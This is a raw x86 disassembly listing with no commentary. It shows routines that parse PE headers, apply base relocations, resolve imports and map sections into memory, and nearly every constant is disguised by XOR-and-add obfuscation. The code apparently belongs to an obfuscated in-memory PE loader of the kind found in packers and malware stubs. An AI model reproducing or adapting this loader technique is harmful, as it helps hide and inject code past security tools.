  425840:	mov    ebx,DWORD PTR [ebp+0xc]
  425843:	mov    ebx,DWORD PTR [ebx+0x7c]
  425846:	add    ebx,eax
  425848:	cmp    edi,ebx
  42584a:	jae    0x425850
  42584c:	mov    esi,DWORD PTR [esi]
  42584e:	jmp    0x425858
  425850:	sub    edi,DWORD PTR [ebp+0x8]
  425853:	mov    DWORD PTR [esi],edi
  425855:	mov    esi,DWORD PTR [ebp-0x10]
  425858:	test   esi,esi
  42585a:	je     0x42586a
  42585c:	mov    ebx,DWORD PTR [ebp-0x8]
  42585f:	inc    ebx
  425860:	mov    DWORD PTR [ebp-0x8],ebx
  425863:	cmp    ebx,DWORD PTR [ebp-0x4]
  425866:	jb     0x425820
  425868:	jmp    0x4257f1
  42586a:	xor    eax,eax
  42586c:	pop    edi
  42586d:	pop    esi
  42586e:	pop    ebx
  42586f:	leave  
  425870:	ret    0x8
  425873:	push   ebp
  425874:	mov    ebp,esp
  425876:	sub    esp,0x2c
  425879:	mov    edx,0xf89c85b0
  42587e:	mov    DWORD PTR [ebp-0x4],edx
  425881:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  425888:	mov    eax,DWORD PTR [ebp-0x4]
  42588b:	mov    ecx,DWORD PTR [ebp-0x4]
  42588e:	mov    ecx,DWORD PTR [ebp-0x4]
  425891:	mov    ecx,DWORD PTR [ebp-0x4]
  425894:	mov    ecx,DWORD PTR [ebp-0x4]
  425897:	mov    ecx,DWORD PTR [ebp-0x4]
  42589a:	push   ebx
  42589b:	mov    ebx,DWORD PTR [ebp+0x10]
  42589e:	push   esi
  42589f:	mov    esi,0x75108a4
  4258a4:	mov    DWORD PTR [ebp-0x10],0x352eb2e
  4258ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4258ae:	mov    ebx,DWORD PTR [ebx+0x190]
  4258b4:	push   edi
  4258b5:	mov    edi,0x3272ec
  4258ba:	xor    ecx,esi
  4258bc:	xor    eax,esi
  4258be:	add    eax,edi
  4258c0:	add    ecx,edi
  4258c2:	mov    DWORD PTR [ebp-0x18],eax
  4258c5:	cmp    ecx,DWORD PTR [ebx]
  4258c7:	je     0x425b48
  4258cd:	mov    ebx,DWORD PTR [ebp-0x4]
  4258d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4258d3:	xor    ebx,esi
  4258d5:	add    ebx,edi
  4258d7:	cmp    ebx,ecx
  4258d9:	je     0x425b48
  4258df:	mov    ebx,DWORD PTR [ebp-0x4]
  4258e2:	mov    ecx,DWORD PTR [ecx+0x80]
  4258e8:	xor    ebx,esi
  4258ea:	add    ebx,edi
  4258ec:	cmp    ecx,ebx
  4258ee:	je     0x425b43
  4258f4:	add    ecx,DWORD PTR [ebp+0x8]
  4258f7:	mov    DWORD PTR [ebp-0x2c],ecx
  4258fa:	mov    ebx,edx
  4258fc:	xor    ebx,esi
  4258fe:	add    ebx,edi
  425900:	mov    DWORD PTR [ebp-0x10],ebx
  425903:	mov    ebx,DWORD PTR [ebp-0x10]
  425906:	cmp    ebx,edx
  425908:	je     0x42591c
  42590a:	mov    edx,DWORD PTR [ebp-0x10]
  42590d:	mov    ebx,DWORD PTR [ebp-0x4]
  425910:	imul   edx,edx,0x14
  425913:	xor    ebx,esi
  425915:	add    ebx,edi
  425917:	cmp    DWORD PTR [edx+ecx*1],ebx
  42591a:	jne    0x425933
  42591c:	mov    edx,DWORD PTR [ebp-0x10]
  42591f:	mov    ebx,DWORD PTR [ebp-0x4]
  425922:	imul   edx,edx,0x14
  425925:	xor    ebx,esi
  425927:	add    ebx,edi
  425929:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  42592d:	je     0x425b35
  425933:	mov    eax,DWORD PTR [ebp-0x4]
  425936:	mov    ebx,DWORD PTR [ebp-0x4]
  425939:	mov    eax,DWORD PTR [ebp-0x10]
  42593c:	imul   eax,eax,0x14
  42593f:	add    eax,ecx
  425941:	mov    ecx,DWORD PTR [eax+0x10]
  425944:	add    ecx,DWORD PTR [ebp+0x8]
  425947:	xor    ebx,esi
  425949:	mov    DWORD PTR [ebp-0x1c],ecx
  42594c:	mov    ecx,DWORD PTR [ebp-0x4]
  42594f:	mov    edx,DWORD PTR [ebp-0x4]
  425952:	xor    ecx,esi
  425954:	add    ecx,edi
  425956:	xor    edx,esi
  425958:	mov    DWORD PTR [ebp-0x24],ecx
  42595b:	mov    ecx,DWORD PTR [eax]
  42595d:	add    edx,edi
  42595f:	add    ebx,edi
  425961:	cmp    ecx,edx
  425963:	je     0x42596b
  425965:	add    ecx,DWORD PTR [ebp+0x8]
  425968:	mov    DWORD PTR [ebp-0x24],ecx
  42596b:	mov    ecx,DWORD PTR [ebp-0x4]
  42596e:	xor    ecx,esi
  425970:	add    ecx,DWORD PTR [eax+0xc]
  425973:	mov    eax,DWORD PTR [ebp+0x8]
  425976:	lea    eax,[ecx+eax*1+0x3272ec]
  42597d:	mov    DWORD PTR [ebp+0xc],eax
  425980:	mov    DWORD PTR [ebp-0x28],0xf89c85bd
  425987:	mov    eax,DWORD PTR [ebp+0x10]
  42598a:	push   DWORD PTR [ebp+0xc]
  42598d:	mov    eax,DWORD PTR [eax+0x1d8]
  425993:	call   DWORD PTR [eax]
  425995:	mov    ecx,DWORD PTR [ebp-0x4]
  425998:	xor    ecx,esi
  42599a:	add    ecx,edi
  42599c:	mov    DWORD PTR [ebp-0xc],eax
  42599f:	cmp    ecx,eax
  4259a1:	jne    0x4259b5
  4259a3:	mov    eax,DWORD PTR [ebp+0x10]
  4259a6:	push   DWORD PTR [ebp+0xc]
  4259a9:	mov    eax,DWORD PTR [eax+0x1d8]
  4259af:	call   DWORD PTR [eax+0xc]
  4259b2:	mov    DWORD PTR [ebp-0xc],eax
  4259b5:	mov    DWORD PTR [ebp-0x20],0x7f661b29
  4259bc:	mov    DWORD PTR [ebp-0x20],0xf89c9859
  4259c3:	mov    eax,DWORD PTR [ebp-0x4]
  4259c6:	xor    eax,esi
  4259c8:	add    eax,edi
  4259ca:	cmp    eax,DWORD PTR [ebp-0xc]
  4259cd:	jne    0x4259f2
  4259cf:	mov    eax,DWORD PTR [ebp-0x8]
  4259d2:	mov    ecx,DWORD PTR [ebp-0x20]
  4259d5:	xor    eax,esi
  4259d7:	xor    ecx,esi
  4259d9:	lea    ebx,[ebx+eax*1+0x3272ec]
  4259e0:	mov    eax,DWORD PTR [ebp+0x10]
  4259e3:	mov    eax,DWORD PTR [eax+0x1d8]
  4259e9:	add    ecx,edi
  4259eb:	imul   ecx,ebx
  4259ee:	push   ecx
  4259ef:	call   DWORD PTR [eax+0x24]
  4259f2:	mov    eax,DWORD PTR [ebp-0x4]
  4259f5:	xor    eax,esi
  4259f7:	add    eax,edi
  4259f9:	cmp    eax,DWORD PTR [ebp-0xc]
  4259fc:	jne    0x425a0d
  4259fe:	mov    eax,DWORD PTR [ebp-0x28]
  425a01:	xor    eax,esi
  425a03:	add    eax,edi
  425a05:	cmp    ebx,eax
  425a07:	jbe    0x425987
  425a0d:	mov    eax,DWORD PTR [ebp-0x4]
  425a10:	xor    eax,esi
  425a12:	add    eax,edi
  425a14:	cmp    eax,DWORD PTR [ebp-0xc]
  425a17:	jne    0x425a30
  425a19:	mov    eax,DWORD PTR [ebp-0x8]
  425a1c:	mov    ecx,DWORD PTR [ebp-0x18]
  425a1f:	xor    eax,esi
  425a21:	lea    eax,[ecx+eax*1+0x3272ec]
  425a28:	mov    DWORD PTR [ebp-0x18],eax
  425a2b:	jmp    0x425b1f
  425a30:	mov    DWORD PTR [ebp-0x14],0x1121b28
  425a37:	mov    DWORD PTR [ebp+0xc],0xe042d2e
  425a3e:	mov    ebx,DWORD PTR [ebp-0x4]
  425a41:	xor    ebx,esi
  425a43:	add    ebx,edi
  425a45:	jmp    0x425b0c
  425a4a:	mov    eax,DWORD PTR [ebp-0x4]
  425a4d:	xor    eax,esi
  425a4f:	add    eax,edi
  425a51:	mov    DWORD PTR [ebp-0x14],eax
  425a54:	mov    eax,DWORD PTR [ebp-0x4]
  425a57:	xor    eax,esi
  425a59:	add    eax,edi
  425a5b:	mov    DWORD PTR [ebp+0xc],eax
  425a5e:	mov    ecx,DWORD PTR [ebp-0x4]
  425a61:	mov    eax,DWORD PTR [ebp-0x24]
  425a64:	xor    ecx,esi
  425a66:	add    ecx,edi
  425a68:	cmp    ecx,eax
  425a6a:	je     0x425a72
  425a6c:	mov    eax,DWORD PTR [eax+ebx*4]
  425a6f:	mov    DWORD PTR [ebp-0x14],eax
  425a72:	mov    eax,DWORD PTR [ebp-0x1c]
  425a75:	mov    eax,DWORD PTR [eax+ebx*4]
  425a78:	mov    DWORD PTR [ebp+0xc],eax
  425a7b:	mov    eax,DWORD PTR [ebp-0x4]
  425a7e:	mov    ecx,DWORD PTR [ebp-0x14]
  425a81:	xor    eax,esi
  425a83:	add    eax,edi
  425a85:	cmp    eax,ecx
  425a87:	je     0x425ab2
  425a89:	mov    eax,DWORD PTR [ebp-0x4]
  425a8c:	mov    ecx,DWORD PTR [ebp-0x14]
  425a8f:	xor    eax,esi
  425a91:	add    eax,edi
  425a93:	shr    ecx,0x1f
  425a96:	cmp    eax,ecx
  425a98:	je     0x425ab2
  425a9a:	mov    ecx,DWORD PTR [ebp-0x14]
  425a9d:	mov    eax,DWORD PTR [ebp+0x10]
  425aa0:	mov    eax,DWORD PTR [eax+0x1d8]
  425aa6:	movzx  ecx,cx
  425aa9:	push   ecx
  425aaa:	push   DWORD PTR [ebp-0xc]
  425aad:	call   DWORD PTR [eax+0x8]
  425ab0:	jmp    0x425acb
  425ab2:	mov    eax,DWORD PTR [ebp+0xc]
  425ab5:	add    eax,DWORD PTR [ebp+0x8]
  425ab8:	mov    ecx,DWORD PTR [ebp+0x10]
  425abb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425ac1:	add    eax,0x2
  425ac4:	push   eax
  425ac5:	push   DWORD PTR [ebp-0xc]
  425ac8:	call   DWORD PTR [ecx+0x8]
  425acb:	mov    DWORD PTR [ebp+0xc],eax
  425ace:	mov    eax,DWORD PTR [ebp-0x4]
  425ad1:	mov    ecx,DWORD PTR [ebp+0xc]
  425ad4:	xor    eax,esi
  425ad6:	add    eax,edi
  425ad8:	cmp    eax,ecx
  425ada:	mov    eax,DWORD PTR [ebp-0x8]
  425add:	jne    0x425af0
  425adf:	mov    ecx,DWORD PTR [ebp-0x18]
  425ae2:	xor    eax,esi
  425ae4:	lea    eax,[ecx+eax*1+0x3272ec]
  425aeb:	mov    DWORD PTR [ebp-0x18],eax
  425aee:	jmp    0x425b00
  425af0:	mov    ecx,DWORD PTR [ebp+0xc]
  425af3:	xor    eax,esi
  425af5:	add    eax,edi
  425af7:	imul   eax,ecx
  425afa:	mov    ecx,DWORD PTR [ebp-0x1c]
  425afd:	mov    DWORD PTR [ecx+ebx*4],eax
  425b00:	mov    eax,DWORD PTR [ebp-0x8]
  425b03:	xor    eax,esi
  425b05:	lea    ebx,[ebx+eax*1+0x3272ec]
  425b0c:	mov    eax,DWORD PTR [ebp-0x4]
  425b0f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b12:	xor    eax,esi
  425b14:	add    eax,edi
  425b16:	cmp    DWORD PTR [ecx+ebx*4],eax
  425b19:	jne    0x425a4a
  425b1f:	mov    edx,DWORD PTR [ebp-0x10]
  425b22:	mov    ecx,DWORD PTR [ebp-0x2c]
  425b25:	mov    eax,DWORD PTR [ebp-0x18]
  425b28:	sub    edx,0x3272eb
  425b2e:	xor    edx,esi
  425b30:	jmp    0x4258fa
  425b35:	mov    ecx,DWORD PTR [ebp-0x4]
  425b38:	xor    ecx,esi
  425b3a:	add    ecx,edi
  425b3c:	cmp    eax,ecx
  425b3e:	mov    eax,DWORD PTR [ebp-0x4]
  425b41:	jne    0x425b4b
  425b43:	mov    eax,DWORD PTR [ebp-0x8]
  425b46:	jmp    0x425b4b
  425b48:	mov    eax,DWORD PTR [ebp-0x4]
  425b4b:	xor    eax,esi
  425b4d:	add    eax,edi
  425b4f:	pop    edi
  425b50:	pop    esi
  425b51:	pop    ebx
  425b52:	leave  
  425b53:	ret    0xc
  425b56:	push   ebp
  425b57:	mov    ebp,esp
  425b59:	sub    esp,0x28
  425b5c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425b63:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  425b6a:	mov    eax,DWORD PTR [ebp+0xc]
  425b6d:	mov    DWORD PTR [ebp+0xc],eax
  425b70:	push   esi
  425b71:	mov    eax,eax
  425b73:	mov    eax,DWORD PTR [ebp-0x4]
  425b76:	mov    esi,DWORD PTR [ebp+0x8]
  425b79:	mov    ecx,0x75108a4
  425b7e:	xor    eax,ecx
  425b80:	mov    edx,0x3272ec
  425b85:	add    eax,edx
  425b87:	cmp    esi,eax
  425b89:	je     0x425cb0
  425b8f:	mov    eax,DWORD PTR [ebp+0x8]
  425b92:	mov    esi,DWORD PTR [ebp+0x8]
  425b95:	add    esi,DWORD PTR [eax+0x3c]
  425b98:	push   edi
  425b99:	mov    DWORD PTR [ebp+0xc],esi
  425b9c:	mov    DWORD PTR [ebp-0x1c],0xf89c85bd
  425ba3:	mov    eax,DWORD PTR [ebp-0x1c]
  425ba6:	mov    esi,DWORD PTR [ebp-0x4]
  425ba9:	mov    edi,DWORD PTR [ebp+0xc]
  425bac:	xor    esi,ecx
  425bae:	xor    eax,ecx
  425bb0:	add    esi,edx
  425bb2:	cmp    DWORD PTR [edi+eax*8+0x19397d8],esi
  425bb9:	je     0x425caa
  425bbf:	mov    esi,DWORD PTR [ebp+0xc]
  425bc2:	mov    eax,DWORD PTR [ebp+0x8]
  425bc5:	add    eax,DWORD PTR [esi+0xa0]
  425bcb:	mov    esi,DWORD PTR [ebp+0x8]
  425bce:	mov    edi,DWORD PTR [ebp+0xc]
  425bd1:	sub    esi,DWORD PTR [edi+0x34]
  425bd4:	mov    edi,DWORD PTR [ebp-0x4]
  425bd7:	xor    edi,ecx
  425bd9:	add    edi,edx
  425bdb:	mov    DWORD PTR [ebp-0x24],esi
  425bde:	cmp    esi,edi
  425be0:	je     0x425caa
  425be6:	mov    esi,DWORD PTR [ebp-0x4]
  425be9:	xor    esi,ecx
  425beb:	add    esi,edx
  425bed:	mov    DWORD PTR [ebp-0x8],esi
  425bf0:	push   ebx
  425bf1:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  425bf8:	jmp    0x425c94
  425bfd:	mov    esi,DWORD PTR [ebp-0x4]
  425c00:	xor    esi,ecx
  425c02:	lea    edi,[ebx-0x8]
  425c05:	add    esi,edx
  425c07:	shr    edi,1
  425c09:	cmp    esi,edi
  425c0b:	jae    0x425c7a
  425c0d:	sub    edi,esi
  425c0f:	lea    ebx,[eax+esi*2+0x8]
  425c13:	mov    DWORD PTR [ebp-0x18],edi
  425c16:	movzx  esi,WORD PTR [ebx]
  425c19:	and    esi,0xfff
  425c1f:	mov    DWORD PTR [ebp-0x14],esi
  425c22:	mov    edi,DWORD PTR [ebp-0x14]
  425c25:	mov    esi,DWORD PTR [eax]
  425c27:	sub    esi,edx
  425c29:	add    edi,esi
  425c2b:	movzx  esi,WORD PTR [ebx]
  425c2e:	shr    esi,0xc
  425c31:	xor    edi,ecx
  425c33:	mov    DWORD PTR [ebp-0x20],edi
  425c36:	mov    DWORD PTR [ebp-0x14],esi
  425c39:	mov    esi,DWORD PTR [ebp-0x20]
  425c3c:	mov    edi,DWORD PTR [ebp+0x8]
  425c3f:	xor    esi,ecx
  425c41:	lea    esi,[esi+edi*1+0x3272ec]
  425c48:	mov    DWORD PTR [ebp-0x20],esi
  425c4b:	mov    esi,DWORD PTR [ebp-0x10]
  425c4e:	mov    edi,DWORD PTR [ebp-0x14]
  425c51:	xor    esi,ecx
  425c53:	add    esi,edx
  425c55:	cmp    edi,esi
  425c57:	jne    0x425c6f
  425c59:	mov    esi,DWORD PTR [ebp-0x10]
  425c5c:	mov    edi,DWORD PTR [ebp-0x14]
  425c5f:	xor    esi,ecx
  425c61:	add    esi,edx
  425c63:	cmp    edi,esi
  425c65:	jne    0x425c6f
  425c67:	mov    esi,DWORD PTR [ebp-0x20]
  425c6a:	mov    edi,DWORD PTR [ebp-0x24]
  425c6d:	add    DWORD PTR [esi],edi
  425c6f:	add    ebx,0x2
  425c72:	dec    DWORD PTR [ebp-0x18]
  425c75:	jne    0x425c16
  425c77:	mov    ebx,DWORD PTR [ebp-0xc]
  425c7a:	add    DWORD PTR [ebp-0x8],ebx
  425c7d:	mov    esi,DWORD PTR [ebp-0x1c]
  425c80:	mov    edi,DWORD PTR [ebp-0x8]
  425c83:	mov    ebx,DWORD PTR [ebp+0xc]
  425c86:	xor    esi,ecx
  425c88:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397dc]
  425c8f:	jae    0x425ca9
  425c91:	add    eax,DWORD PTR [ebp-0xc]
  425c94:	mov    esi,DWORD PTR [ebp-0x4]
  425c97:	mov    ebx,DWORD PTR [eax+0x4]
  425c9a:	xor    esi,ecx
  425c9c:	add    esi,edx
  425c9e:	mov    DWORD PTR [ebp-0xc],ebx
  425ca1:	cmp    ebx,esi
  425ca3:	jne    0x425bfd
  425ca9:	pop    ebx
  425caa:	mov    eax,DWORD PTR [ebp-0x28]
  425cad:	pop    edi
  425cae:	jmp    0x425cb3
  425cb0:	mov    eax,DWORD PTR [ebp-0x4]
  425cb3:	xor    eax,ecx
  425cb5:	add    eax,edx
  425cb7:	pop    esi
  425cb8:	leave  
  425cb9:	ret    0x8
  425cbc:	push   ebp
  425cbd:	mov    ebp,esp
  425cbf:	sub    esp,0xd8
  425cc5:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425ccc:	mov    DWORD PTR [ebp-0x24],0xf89c85b1
  425cd3:	mov    eax,DWORD PTR [ebp-0x4]
  425cd6:	push   ebx
  425cd7:	push   esi
  425cd8:	mov    esi,0x75108a4
  425cdd:	xor    eax,esi
  425cdf:	push   edi
  425ce0:	mov    edi,0x3272ec
  425ce5:	add    eax,edi
  425ce7:	mov    DWORD PTR [ebp-0x18],eax
  425cea:	mov    eax,DWORD PTR [ebp-0x4]
  425ced:	xor    eax,esi
  425cef:	add    eax,edi
  425cf1:	mov    DWORD PTR [ebp-0x8],eax
  425cf4:	mov    ebx,DWORD PTR [ebp+0x20]
  425cf7:	mov    eax,DWORD PTR [ebp-0x1c]
  425cfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  425cfd:	xor    eax,ecx
  425cff:	mov    DWORD PTR [ebp-0x1c],eax
  425d02:	add    DWORD PTR [ebp-0x1c],0xf89cb5b0
  425d09:	mov    eax,DWORD PTR [ebp-0xc]
  425d0c:	mov    ecx,DWORD PTR [ebp-0xc]
  425d0f:	xor    eax,ecx
  425d11:	mov    DWORD PTR [ebp-0xc],eax
  425d14:	add    DWORD PTR [ebp-0xc],0xf89c85f0
  425d1b:	mov    eax,DWORD PTR [ebp-0x10]
  425d1e:	mov    ecx,DWORD PTR [ebp-0x10]
  425d21:	xor    eax,ecx
  425d23:	mov    DWORD PTR [ebp-0x10],eax
  425d26:	add    DWORD PTR [ebp-0x10],0xf89c85bc
  425d2d:	mov    eax,DWORD PTR [ebp-0x28]
  425d30:	mov    ecx,DWORD PTR [ebp-0x28]
  425d33:	xor    eax,ecx
  425d35:	mov    DWORD PTR [ebp-0x28],eax
  425d38:	add    DWORD PTR [ebp-0x28],0xf89f05b0
  425d3f:	mov    DWORD PTR [ebp+0x20],0xf89cefc5
  425d46:	mov    eax,DWORD PTR [ebp+0x8]
  425d49:	test   eax,eax
  425d4b:	je     0x4261d6
  425d51:	mov    eax,DWORD PTR [ebp+0xc]
  425d54:	test   eax,eax
  425d56:	je     0x4261d6
  425d5c:	mov    eax,DWORD PTR [ebp+0x18]
  425d5f:	test   eax,eax
  425d61:	je     0x4261d6
  425d67:	mov    eax,DWORD PTR [ebp+0x20]
  425d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  425d6d:	xor    eax,0x8a4
  425d72:	add    eax,0x72ec
  425d77:	cmp    WORD PTR [ecx],ax
  425d7a:	jne    0x4261d6
  425d80:	mov    eax,DWORD PTR [ebp-0x4]
  425d83:	xor    eax,esi
  425d85:	add    eax,edi
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	mov    eax,DWORD PTR [ebp-0x4]
  425d8d:	mov    ecx,DWORD PTR [ebp+0x8]
  425d90:	mov    eax,DWORD PTR [ebp+0x8]
  425d93:	add    eax,DWORD PTR [ecx+0x3c]
  425d96:	mov    DWORD PTR [ebp+0xc],eax
  425d99:	mov    eax,DWORD PTR [eax+0x50]
  425d9c:	test   eax,eax
  425d9e:	je     0x4261d6
  425da4:	mov    DWORD PTR [ebp-0x2c],0xf88c85b0
  425dab:	mov    eax,DWORD PTR [ebp-0x2c]
  425dae:	xor    eax,esi
  425db0:	add    eax,edi
  425db2:	mov    DWORD PTR [ebp-0x2c],eax
  425db5:	mov    eax,DWORD PTR [ebp-0x4]
  425db8:	mov    eax,DWORD PTR [ebx+0x190]
  425dbe:	mov    ecx,DWORD PTR [eax]
  425dc0:	mov    ecx,DWORD PTR [ecx+0x3c]
  425dc3:	add    ecx,DWORD PTR [eax]
  425dc5:	mov    eax,DWORD PTR [ebp-0x4]
  425dc8:	mov    eax,DWORD PTR [ebx+0x18c]
  425dce:	mov    edx,DWORD PTR [eax]
  425dd0:	mov    DWORD PTR [ebp-0x20],ecx
  425dd3:	mov    DWORD PTR [ebp+0x20],edx
  425dd6:	cmp    edx,edx
  425dd8:	jne    0x425e0c
  425dda:	mov    eax,DWORD PTR [ebx+0x1d8]
  425de0:	lea    edx,[ebp-0x18]
  425de3:	push   edx
  425de4:	mov    edx,DWORD PTR [ebp-0xc]
  425de7:	xor    edx,esi
  425de9:	add    edx,edi
  425deb:	push   edx
  425dec:	push   DWORD PTR [ecx+0x50]
  425def:	push   DWORD PTR [ebp+0x20]
  425df2:	call   DWORD PTR [eax+0x1c]
  425df5:	mov    eax,DWORD PTR [ebp-0x20]
  425df8:	mov    ecx,DWORD PTR [eax+0x54]
  425dfb:	mov    eax,DWORD PTR [eax+0x50]
  425dfe:	sub    eax,ecx
  425e00:	add    ecx,DWORD PTR [ebp+0x20]
  425e03:	push   ecx
  425e04:	call   0x426773
  425e09:	mov    edx,DWORD PTR [ebp+0x20]
  425e0c:	mov    eax,DWORD PTR [ebx+0x194]
  425e12:	mov    DWORD PTR [eax],edx
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	push   DWORD PTR [eax+0x54]
  425e1a:	push   DWORD PTR [ebp+0x8]
  425e1d:	push   edx
  425e1e:	call   0x426669
  425e23:	mov    ecx,DWORD PTR [ebp+0x20]
  425e26:	mov    eax,DWORD PTR [ecx+0x3c]
  425e29:	add    eax,ecx
  425e2b:	movzx  ecx,WORD PTR [eax+0x14]
  425e2f:	lea    ecx,[ecx+eax*1+0x18]
  425e33:	mov    DWORD PTR [ebp+0x18],ecx
  425e36:	mov    ecx,DWORD PTR [ebp-0x4]
  425e39:	movzx  edx,WORD PTR [eax+0x6]
  425e3d:	xor    ecx,esi
  425e3f:	add    ecx,edi
  425e41:	mov    DWORD PTR [ebp+0xc],eax
  425e44:	cmp    edx,ecx
  425e46:	je     0x425ef3
  425e4c:	mov    ecx,DWORD PTR [ebp-0x4]
  425e4f:	xor    ecx,esi
  425e51:	add    ecx,edi
  425e53:	mov    DWORD PTR [ebp-0x8],ecx
  425e56:	mov    ecx,DWORD PTR [ebp-0x24]
  425e59:	movzx  edx,WORD PTR [eax+0x6]
  425e5d:	xor    ecx,esi
  425e5f:	sub    edx,ecx
  425e61:	sub    edx,edi
  425e63:	cmp    DWORD PTR [ebp-0x8],edx
  425e66:	ja     0x425ef3
  425e6c:	mov    edx,DWORD PTR [ebp+0x18]
  425e6f:	add    edx,0x8
  425e72:	mov    DWORD PTR [ebp+0x18],edx
  425e75:	jmp    0x425e7a
  425e77:	mov    edx,DWORD PTR [ebp+0x18]
  425e7a:	mov    eax,DWORD PTR [eax+0x38]
  425e7d:	lea    ecx,[eax-0x1]
  425e80:	mov    DWORD PTR [ebp-0x38],eax
  425e83:	mov    eax,DWORD PTR [edx]
  425e85:	test   eax,ecx
  425e87:	je     0x425e90
  425e89:	not    ecx
  425e8b:	and    eax,ecx
  425e8d:	add    eax,DWORD PTR [ebp-0x38]
  425e90:	mov    ecx,DWORD PTR [edx+0x4]
  425e93:	add    ecx,DWORD PTR [ebp+0x20]
  425e96:	push   ecx
  425e97:	call   0x426773
  425e9c:	mov    edx,DWORD PTR [ebp-0x4]
  425e9f:	mov    eax,DWORD PTR [ebp+0x18]
  425ea2:	mov    ecx,DWORD PTR [eax+0x8]
  425ea5:	xor    edx,esi
  425ea7:	add    edx,edi
  425ea9:	cmp    ecx,edx
  425eab:	je     0x425ec4
  425ead:	push   ecx
  425eae:	mov    ecx,DWORD PTR [ebp+0x8]
  425eb1:	add    ecx,DWORD PTR [eax+0xc]
  425eb4:	mov    eax,DWORD PTR [eax+0x4]
  425eb7:	add    eax,DWORD PTR [ebp+0x20]
  425eba:	push   ecx
  425ebb:	push   eax
  425ebc:	call   0x426669
  425ec1:	mov    eax,DWORD PTR [ebp+0x18]
  425ec4:	mov    ecx,DWORD PTR [ebp-0x24]
  425ec7:	mov    edx,DWORD PTR [ebp-0x8]
  425eca:	add    eax,0x28
  425ecd:	xor    ecx,esi
  425ecf:	lea    ecx,[edx+ecx*1+0x3272ec]
  425ed6:	mov    edx,DWORD PTR [ebp+0xc]
  425ed9:	mov    DWORD PTR [ebp+0x18],eax
  425edc:	mov    eax,DWORD PTR [ebp-0x24]
  425edf:	movzx  edx,WORD PTR [edx+0x6]
  425ee3:	xor    eax,esi
  425ee5:	sub    edx,eax
  425ee7:	mov    eax,DWORD PTR [ebp+0xc]
  425eea:	sub    edx,edi
  425eec:	mov    DWORD PTR [ebp-0x8],ecx
  425eef:	cmp    ecx,edx
  425ef1:	jbe    0x425e77
  425ef3:	mov    edx,DWORD PTR [ebx+0x18c]
  425ef9:	mov    ecx,DWORD PTR [ebp+0x20]
  425efc:	cmp    ecx,DWORD PTR [edx]
  425efe:	jne    0x425f27
  425f00:	mov    eax,DWORD PTR [ebx+0x1d8]
  425f06:	lea    edx,[ebp-0x18]
  425f09:	push   edx
  425f0a:	mov    edx,DWORD PTR [ebp-0x10]
  425f0d:	xor    edx,esi
  425f0f:	add    edx,edi
  425f11:	push   edx
  425f12:	mov    edx,DWORD PTR [ebp-0x20]
  425f15:	push   DWORD PTR [edx+0x54]
  425f18:	push   ecx
  425f19:	call   DWORD PTR [eax+0x1c]
  425f1c:	test   eax,eax
  425f1e:	je     0x4261c7
  425f24:	mov    eax,DWORD PTR [ebp+0xc]
  425f27:	mov    ecx,DWORD PTR [ebx+0x1c8]
  425f2d:	mov    ecx,DWORD PTR [ecx]
  425f2f:	xor    ecx,esi
  425f31:	add    ecx,edi
  425f33:	je     0x4260f2
  425f39:	mov    eax,DWORD PTR [ebp-0x4]
  425f3c:	xor    eax,esi
  425f3e:	add    eax,edi
  425f40:	and    DWORD PTR [ebp+0x8],0x0
  425f44:	mov    DWORD PTR [ebp-0x14],eax
  425f47:	mov    ecx,0xf89c8524
  425f4c:	mov    eax,0xf89c85dc
  425f51:	mov    DWORD PTR [ebp-0x58],0xf89c8526
  425f58:	mov    DWORD PTR [ebp-0x54],0xf89c852c
  425f5f:	mov    DWORD PTR [ebp-0x50],eax
  425f62:	mov    DWORD PTR [ebp-0x4c],ecx
  425f65:	mov    DWORD PTR [ebp-0x48],ecx
  425f68:	mov    DWORD PTR [ebp-0x44],0xf89c85b0
  425f6f:	mov    edx,DWORD PTR [ebp+0x8]
  425f72:	mov    ecx,0x8a4
  425f77:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  425f7c:	mov    edx,0x72ec
  425f81:	add    cx,dx
  425f84:	mov    edx,DWORD PTR [ebp+0x8]
  425f87:	inc    DWORD PTR [ebp+0x8]
  425f8a:	cmp    DWORD PTR [ebp+0x8],0x6
  425f8e:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  425f96:	jb     0x425f6f
  425f98:	mov    ecx,0xf89c8522
  425f9d:	mov    DWORD PTR [ebp-0xb0],eax
  425fa3:	mov    DWORD PTR [ebp-0x9c],eax
  425fa9:	mov    DWORD PTR [ebp-0x74],eax
  425fac:	mov    DWORD PTR [ebp-0x70],eax
  425faf:	lea    eax,[ecx+0x1]
  425fb2:	mov    edx,0xf89c85fe
  425fb7:	mov    DWORD PTR [ebp-0x64],eax
  425fba:	mov    DWORD PTR [ebp-0x60],eax
  425fbd:	mov    DWORD PTR [ebp-0xb4],0xf89c85c4
  425fc7:	mov    DWORD PTR [ebp-0xac],ecx
  425fcd:	mov    DWORD PTR [ebp-0xa8],edx
  425fd3:	mov    DWORD PTR [ebp-0xa4],0xf89c85d9
  425fdd:	mov    DWORD PTR [ebp-0xa0],0xf89c8526
  425fe7:	mov    DWORD PTR [ebp-0x98],0xf89c85fd
  425ff1:	mov    DWORD PTR [ebp-0x94],0xf89c8526
  425ffb:	mov    DWORD PTR [ebp-0x90],0xf89c852c
  426005:	mov    DWORD PTR [ebp-0x8c],ecx
  42600b:	mov    DWORD PTR [ebp-0x88],0xf89c8529
  426015:	mov    DWORD PTR [ebp-0x84],edx
  42601b:	mov    DWORD PTR [ebp-0x80],0xf89c8527
  426022:	mov    DWORD PTR [ebp-0x7c],ecx
  426025:	mov    DWORD PTR [ebp-0x78],0xf89c85f1
  42602c:	mov    DWORD PTR [ebp-0x6c],ecx
  42602f:	mov    DWORD PTR [ebp-0x68],0xf89c85dd
  426036:	mov    DWORD PTR [ebp-0x5c],0xf89c85b0
